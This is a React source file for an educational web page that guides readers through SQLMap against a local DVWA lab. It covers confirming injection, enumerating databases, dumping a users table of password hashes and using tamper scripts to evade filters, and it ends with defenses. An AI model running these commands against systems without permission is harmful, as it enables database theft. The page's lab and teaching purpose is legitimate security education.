import { Helmet } from 'react-helmet-async'
import ToolLayout from '../components/ToolLayout'

function Section({ id, icon, title, subtitle, children }) {
  return (
    <section id={id} className="glass p-6 sm:p-7 mb-6 scroll-mt-24">
      <div className="flex items-center gap-3 mb-1">
        <span className="text-xl">{icon}</span>
        <h2 className="text-lg sm:text-xl font-extrabold text-white m-0">{title}</h2>
      </div>
      {subtitle && <p className="text-xs text-slate-400 mt-1 mb-4">{subtitle}</p>}
      {!subtitle && <div className="mb-2" />}
      <div className="space-y-4 text-sm text-slate-300 leading-relaxed">{children}</div>
    </section>
  )
}

function CodeBlock({ title, lines }) {
  return (
    <div className="rounded-xl overflow-hidden border border-white/10" style={{ background: '#0a0f1e' }}>
      <div className="flex items-center gap-2 px-4 py-2 border-b border-white/10" style={{ background: '#111827' }}>
        <span className="w-2.5 h-2.5 rounded-full bg-red-500/80" />
        <span className="w-2.5 h-2.5 rounded-full bg-yellow-500/80" />
        <span className="w-2.5 h-2.5 rounded-full bg-green-500/80" />
        {title && <span className="ml-2 text-[11px] font-mono text-slate-400">{title}</span>}
      </div>
      <pre className="p-4 overflow-x-auto text-[13px] leading-relaxed font-mono text-green-300 whitespace-pre-wrap">
{lines}
      </pre>
    </div>
  )
}

function WarningBox({ children }) {
  return (
    <div className="rounded-xl p-4 border border-red-500/30" style={{ background: 'rgba(239,68,68,0.07)' }}>
      <div className="flex items-center gap-2 text-red-300 font-bold text-sm mb-1.5">⚠️ Legal &amp; Ethical Warning</div>
      <div className="text-xs text-red-200/80 leading-relaxed">{children}</div>
    </div>
  )
}

function InfoBox({ title, icon = '💡', children }) {
  return (
    <div className="rounded-xl p-4 border border-cyan-500/25" style={{ background: 'rgba(6,182,212,0.06)' }}>
      <div className="flex items-center gap-2 text-cyan-300 font-bold text-sm mb-1.5">{icon} {title}</div>
      <div className="text-xs text-slate-300 leading-relaxed">{children}</div>
    </div>
  )
}

function FeatureGrid({ items }) {
  return (
    <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
      {items.map(f => (
        <div key={f.t} className="rounded-xl p-4 border border-white/8" style={{ background: 'rgba(0,0,0,0.3)' }}>
          <div className="text-2xl mb-1">{f.i}</div>
          <div className="text-sm font-semibold text-white mb-0.5">{f.t}</div>
          <div className="text-xs text-slate-400">{f.d}</div>
        </div>
      ))}
    </div>
  )
}

function IssueRow({ issue, fix }) {
  return (
    <div className="rounded-xl p-4 border border-white/8" style={{ background: 'rgba(0,0,0,0.3)' }}>
      <div className="flex items-start gap-2">
        <span className="text-red-400 font-bold mt-0.5">✕</span>
        <div className="min-w-0">
          <div className="text-sm font-semibold text-white mb-1">{issue}</div>
          <div className="text-xs text-slate-400 leading-relaxed">
            <span className="text-green-400 font-semibold">Fix: </span>{fix}
          </div>
        </div>
      </div>
    </div>
  )
}

const faq = [
  { q: "What is SQLMap?", a: "SQLMap is an open-source tool that automates SQL injection: you give it a URL with a parameter, it confirms the injection, fingerprints the database, and can list tables and dump data. What takes hours by hand takes it minutes." },
  { q: "Is SQLMap illegal?", a: "The tool is legal and used in authorized audits. Pointing it at any site you do not own or lack permission to test is illegal — injection dumps real user data. Practice on DVWA or OWASP Juice Shop running on your own machine." },
  { q: "What does --dbs do?", a: "--dbs lists all databases on the server after SQLMap confirms injection. Then -D picks one database, --tables lists its tables, -T picks a table, and --dump pulls the rows." },
  { q: "What is the difference between --batch and interactive mode?", a: "By default SQLMap asks questions mid-run (which payload? try harder?). --batch answers yes to everything so a lab run finishes unattended. Add --random-agent to rotate the user-agent string." },
  { q: "What is tamper scripts (--tamper)?", a: "Tamper scripts rewrite payloads to slip past weak filters — for example space2comment swaps spaces for comments. They beat naive keyword blocklists in labs, not real WAFs." },
  { q: "How do I point SQLMap at a login form?", a: "Capture the POST request (browser devtools or Burp), save it to a file, and run sqlmap -r request.txt -p username. The -p flag tells SQLMap which parameter to inject so it ignores the rest." },
  { q: "What is --risk and --level?", a: "--level 1-5 controls how many parameters and headers get tested; --risk 1-3 controls how dangerous the payloads are (risk 3 can UPDATE/DELETE data). Keep both at 1 in shared labs." },
  { q: "How do I protect my own app from SQLMap?", a: "Use prepared statements (parameterized queries) everywhere, give the app DB user minimum privileges, put a WAF like ModSecurity in front, and log UNION/SELECT probe patterns. SQLMap then finds nothing to exploit." },
]

const howItWorks = [
  "Install SQLMap and confirm it runs.",
  "Point it at a DVWA URL and confirm the injection.",
  "Enumerate databases, tables and columns.",
  "Dump a lab table and try tamper scripts.",
  "Fix your own apps with prepared statements + WAF.",
]

const schema = {
  '@context': 'https://schema.org',
  '@graph': [
    {
      '@type': 'TechArticle',
      headline: "SQLMap — SQL Injection Tester Guide (Educational)",
      description: "Step-by-step SQLMap reference: confirm injection, enumerate databases, dump lab tables, tamper scripts, and defense.",
      about: "SQLMap SQL injection tester",
      educationalUse: 'Testing, education, and authorized use only',
    },
    {
      '@type': 'FAQPage',
      mainEntity: faq.map(f => ({
        '@type': 'Question',
        name: f.q,
        acceptedAnswer: { '@type': 'Answer', text: f.a },
      })),
    },
  ],
}

export default function hncker_sqlmap() {
  return (
    <ToolLayout
      title="SQLMap — SQL Injection Tester Guide"
      desc="Step-by-step SQLMap reference: find, confirm and exploit SQL injection on lab targets (DVWA, OWASP Juice Shop). Educational use only."
      icon="💉"
      iconBg="linear-gradient(135deg, rgba(0,255,65,0.18), rgba(6,182,212,0.08))"
      category="security"
      slug="hncker/sqlmap"
      faq={faq}
      howItWorks={howItWorks}
      schema={schema}
    >
      <Helmet>
        <meta name="robots" content="index, follow" />
        <meta property="og:image" content="https://www.uptools.in/assets/tools/sqlmap/sqlmap_scan.png" />
      </Helmet>

      <Section id="video" icon="🎬" title="Video Tutorial" subtitle="Learn it on the HNCKER channel">
        <div className="max-w-3xl mx-auto">
          <a href="https://www.youtube.com/@hncker" target="_blank" rel="noopener noreferrer"
            className="flex items-center gap-4 rounded-xl overflow-hidden border border-white/10 no-underline p-5 hover:border-red-500/40 transition-all"
            style={{ background: 'rgba(0,0,0,0.4)' }}>
            <div className="w-14 h-14 rounded-full bg-red-600/90 flex items-center justify-center shrink-0">
              <svg viewBox="0 0 24 24" className="w-6 h-6 ml-0.5 fill-white"><path d="M8 5v14l11-7z" /></svg>
            </div>
            <div>
              <p className="text-sm font-semibold text-white m-0">SQLMap — video walkthroughs on YouTube</p>
              <p className="text-xs text-slate-400 m-0 mt-1">Full tutorials on the @hncker channel. Watch, then practice below in your own lab.</p>
            </div>
          </a>
        </div>
      </Section>

      <WarningBox>
        SQLMap automates database theft. Run it <b>only against your own lab apps (DVWA, OWASP Juice Shop) or targets with written permission</b>. Testing any other site is illegal. This page is for <b>educational and authorized use only</b>.
      </WarningBox>

      <Section id="overview" icon="💉" title="What is SQLMap?" subtitle="Automate injection — on lab targets">
        <p>
          <b>SQLMap</b> automates SQL injection end to end: confirm the hole, fingerprint the database, list tables and dump rows. A single command walks a lab target from one URL parameter to full table contents.
        </p>
        <p>
          Injection is still a top web risk because one concatenated query exposes the whole database. Learn the attack on DVWA so you can kill the bug class with prepared statements in your own code.
        </p>
        <FeatureGrid items={[
  { i: "🎯", t: "Auto-detect", d: "Finds the injection type for you." },
  { i: "🗄️", t: "Full dump", d: "--dbs to --dump: databases to rows." },
  { i: "🥷", t: "Tamper scripts", d: "Bypass naive filters in labs." },
  { i: "🐃", t: "DB takeover", d: "--os-shell on misconfigured lab DBs." },
]} />
      </Section>

      <Section id="requirements" icon="⚙️" title="Requirements" subtitle="What you need before running">
        <ul className="list-none p-0 m-0 space-y-2">
          {["Kali Linux (pre-installed) or Python 3 on any OS", "A lab target: DVWA or OWASP Juice Shop on localhost", "The vulnerable URL or a saved request file (-r)", "Written permission if anything is not yours"].map((t) => (
            <li key={t} className="flex items-start gap-2 text-slate-300">
              <span>☑️</span><span>{t}</span>
            </li>
          ))}
        </ul>
      </Section>

      <Section id="installation" icon="🛠️" title="Installation" subtitle="One command to install">
        <CodeBlock title="terminal" lines={`sqlmap --version
# sqlmap 1.8.x ready`} />
        <CodeBlock title="debian / ubuntu" lines={`sudo apt update
sudo apt install sqlmap`} />
        <InfoBox title="Kali has it already">
          On Kali Linux SQLMap is pre-installed — <span className="font-mono">sqlmap --version</span> confirms it. Debian/Ubuntu users install the <span className="font-mono">sqlmap</span> package, or clone GitHub for the latest.
        </InfoBox>
      </Section>

      <Section id="confirm" icon="🎯" title="Step 1 — Confirm Injection" subtitle="Prove the hole exists">
        <p className="text-xs text-slate-400">Confirm the injection on your DVWA lab:</p>
        <CodeBlock title="terminal" lines={`sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --batch
# GET parameter id is MySQL >= 5 injectable`} />
        <InfoBox title="Confirm first">
          SQLMap fingerprints the backend (MySQL, Postgres...) and injection type (boolean, UNION, time-based). Confirm this step on DVWA with security set to LOW.
        </InfoBox>
      </Section>

      <Section id="enum" icon="🗄️" title="Step 2 — Enumerate" subtitle="Map the database">
        <p className="text-xs text-slate-400">List databases, then tables inside dvwa:</p>
        <CodeBlock title="terminal" lines={`sqlmap -u "...id=1&Submit=Submit" --dbs --batch
# available databases: dvwa, information_schema
sqlmap -u "..." -D dvwa --tables --batch
# users, guestbook`} />
        <InfoBox title="Walk the tree">
          Walk the hierarchy: server to databases to tables to columns. Each flag narrows one level — never jump straight to --dump or you will miss the layout.
        </InfoBox>
      </Section>

      <Section id="dump" icon="📂" title="Step 3 — Dump Lab Data" subtitle="Read lab rows">
        <p className="text-xs text-slate-400">Dump the lab users table (your own DVWA only):</p>
        <CodeBlock title="terminal" lines={`sqlmap -u "..." -D dvwa -T users --dump --batch
# 5 rows: admin, gordonb, ... password hashes`} />
        <InfoBox title="Dump responsibly">
          Watch how hashes come back — MD5 unsalted in DVWA falls instantly to a wordlist. That is the lesson: hash right (bcrypt) and limit what the app user can read.
        </InfoBox>
      </Section>

      <Section id="tamper" icon="🥷" title="Step 4 — Tamper Scripts" subtitle="Beat naive filters">
        <p className="text-xs text-slate-400">Try a tamper script against a filtered lab input:</p>
        <CodeBlock title="terminal" lines={`sqlmap -u "..." --tamper=space2comment --batch
# bypassed naive space filter`} />
        <InfoBox title="Evasion 101">
          Tampers beat classroom filters, not production WAFs. If the base injection fails without --tamper, fix the request (cookies, login, -p) before blaming the filter.
        </InfoBox>
      </Section>


      <Section id="defense" icon="🛡️" title="Defense — Stop SQL Injection" subtitle="Kill the bug class, not just the tool">
        <CodeBlock title="terminal" lines={`sudo apt install modsecurity-crs
# WAF rules that block injection patterns`} />
        <FeatureGrid items={[
  { i: "❓", t: "Prepared statements", d: "Never build queries with string concat." },
  { i: "🧱", t: "WAF rules", d: "ModSecurity CRS blocks injection probes." },
  { i: "🔒", t: "Least privilege", d: "App DB user: no DROP, no FILE, no admin." },
  { i: "👁️", t: "Log + alert", d: "Alert on UNION/SELECT probe patterns." },
]} />
      </Section>

      <Section id="screenshots" icon="🖼️" title="Screenshot" subtitle="SQLMap in action">
        <figure className="rounded-xl overflow-hidden border border-white/10" style={{ background: 'rgba(0,0,0,0.3)' }}>
          <img src="/assets/tools/sqlmap/sqlmap_scan.png" alt="SQLMap terminal session" width="960" height="540"
            className="w-full h-auto object-contain" loading="lazy" />
          <figcaption className="px-4 py-2 text-xs text-slate-400">A SQLMap run dumping tables from a lab target</figcaption>
        </figure>
      </Section>

      <Section id="flags" icon="🏷️" title="Flags &amp; Options" subtitle="Every option explained">
        <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
          {[["-u", "Target URL with a parameter to test."], ["--dbs", "List databases after confirming injection."], ["-D / -T", "Pick database (-D) and table (-T) for --tables/--dump."], ["--dump", "Dump the selected table rows."], ["-r", "Load a saved HTTP request file (for POST forms)."], ["--batch", "Answer all prompts automatically."], ["--tamper", "Apply evasion script, e.g. space2comment."], ["--risk / --level", "Depth (1-5) and danger (1-3) of tests."]].map(([flag, desc]) => (
            <div key={flag} className="rounded-xl p-4 border border-white/8" style={{ background: 'rgba(0,0,0,0.3)' }}>
              <div className="text-sm font-semibold text-green-300 font-mono mb-1">{flag}</div>
              <div className="text-xs text-slate-400">{desc}</div>
            </div>
          ))}
        </div>
      </Section>

      <Section id="issues" icon="🐞" title="Common Issues & Fixes" subtitle="Real problems people hit">
        <div className="space-y-3">
          {[["No parameter found / not injectable", "SQLMap needs a * marked parameter or a -p name. Save the full POST request with -r, mark the field, and point -p at it."], ["Target times out or blocks you", "DVWA security must be LOW for basic demos, and some setups rate-limit. Lower --threads to 1, add --delay 1, and check the lab app is actually running."], ["--dump returns empty tables", "You picked the wrong database with -D. Run --dbs first, then -D <name> --tables, then -T <table> --dump — one level at a time."], ["Tamper script breaks the payload", "Some tampers conflict with each other or the target stack. Use one tamper at a time (space2comment first) and drop --tamper entirely to confirm the base injection works."]].map(([issue, fix]) => (
            <IssueRow key={issue} issue={issue} fix={fix} />
          ))}
        </div>
      </Section>

      <Section id="resources" icon="🔗" title="Resources" subtitle="Official links">
        <div className="space-y-2">
          {[["📚", "Official SQLMap wiki", "https://github.com/sqlmapproject/sqlmap/wiki"], ["📖", "DVWA lab app", "http://www.dvwa.co.uk/"], ["🎬", "HNCKER tutorials", "https://www.youtube.com/@hncker"]].map(([i, label, href]) => (
            <a key={href} href={href} target="_blank" rel="noopener noreferrer"
              className="flex items-center gap-2 rounded-lg px-3 py-2 border border-white/8 hover:border-brand/40 hover:bg-white/5 transition-all text-slate-300 hover:text-white no-underline">
              <span>{i}</span>
              <span className="text-sm font-medium">{label}</span>
              <span className="ml-auto text-indigo-300 text-xs font-mono break-all">{href}</span>
            </a>
          ))}
        </div>
      </Section>

      <Section id="disclaimer" icon="📜" title="Disclaimer" subtitle="Read before you run anything">
        <p>
          This documentation is provided <b>strictly for educational and authorized purposes</b>. SQLMap automates database theft, so use it only on your own lab apps (DVWA, OWASP Juice Shop) or targets with written permission. Testing anyone else is illegal. The author and this site are not responsible for any misuse.
        </p>
      </Section>
    </ToolLayout>
  )
}
